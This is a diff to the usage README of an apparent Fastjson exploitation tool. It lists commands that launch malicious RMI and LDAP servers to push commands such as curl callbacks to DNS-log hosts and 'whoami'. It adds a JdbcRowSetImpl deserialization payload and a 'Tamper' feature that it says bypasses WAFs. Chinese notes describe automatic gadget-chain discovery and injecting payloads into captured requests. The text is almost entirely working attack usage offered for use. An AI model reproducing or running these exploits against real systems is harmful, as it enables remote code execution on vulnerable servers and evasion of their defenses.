@@ -6,16 +6,23 @@ Usage:
 java -cp fastjson_tool.jar fastjson.HRMIServer 127.0.0.1 80 "curl dnslog.wyzxxz.cn" 
 java -cp fastjson_tool.jar fastjson.HLDAPServer 127.0.0.1 80 "curl dnslog.wyzxxz.cn"
 
-java -cp fastjson_tool.jar fastjson.LDAPRefServerAuto 127.0.0.1 1099 filename
+java -cp fastjson_tool.jar fastjson.HLDAPServer2 127.0.0.1 80 "whoami"
+
+java -cp fastjson_tool.jar fastjson.LDAPRefServerAuto 127.0.0.1 1099 file=filename  tamper=tohex
 java -cp fastjson_tool.jar fastjson.LDAPRefServer2 1099  CommonsCollections1 "curl dnslog.cn"
 
 java -cp fastjson_tool.jar fastjson.BCELEncode "curl dnslog.wyzxxz.cn"
 java -cp fastjson_tool.jar fastjson.EvilRMIServer 8888 1099 "curl dnslog.wyzxxz.cn" el-win/el-linux/groovy
+java -cp fastjson_tool.jar fastjson.Tamper  "{\"abc\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1099/Object\",\"autoCommit\":true}}" 
+
+2021-03-31 新增：
+fastjson.Tamper : fastjson的一些特性，可以绕一些WAF
+fastjson.LDAPRefServerAuto : 新增了一些场景的回显
 
 
 2020-10-30 新增：
 fastjson.LDAPRefServerAuto: 自动找寻反序列可利用的gadget(cb1,cc1-10,spring1-2,groovy1,jdk7u21)。
-java -cp fastjson_tool.jar fastjson.LDAPRefServerAuto 127.0.0.1 1099 filename
+java -cp fastjson_tool.jar fastjson.LDAPRefServerAuto 127.0.0.1 1099 file=filename
 
 filename为请求包，需要插入fastjson攻击语句的地方，用__PAYLOAD__代替。示例：
 POST /fastjson_demo HTTP/1.1
